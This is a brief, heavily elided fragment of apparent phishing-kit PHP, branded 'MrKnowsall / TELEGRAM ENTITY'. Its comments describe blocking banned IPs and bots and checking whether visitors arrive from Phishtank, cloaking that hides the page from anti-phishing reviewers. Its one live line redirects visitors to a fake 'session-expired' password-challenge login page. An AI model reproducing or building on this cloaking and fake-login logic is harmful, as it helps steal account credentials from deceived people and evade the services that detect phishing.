...
/*
// MrKnowsall / TELEGRAM ENTITY "HQ PAGE"
.-..-.     .-.                                     .-.  .-.
: `' :     : :.-.                                  : :  : :
: .. :.--. : `'.',-.,-. .--. .-..-..-. .--.  .--.  : :  : :
: :; :: ..': . `.: ,. :' .; :: `; `; :`._-.'' .; ; : :_ : :_
:_;:_;:_;  :_;:_;:_;:_;`.__.'`.__.__.'`.__.'`.__,_;`.__;`.__;
*/
...
// Checks for Banned IP Addresses and Bots
   ...
   ### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###
	...
	header( 'Location: session-expired?challenge/password?display=login&lang=en-us&src=mail&activity=default&pspid=1197803637&done' ) ;
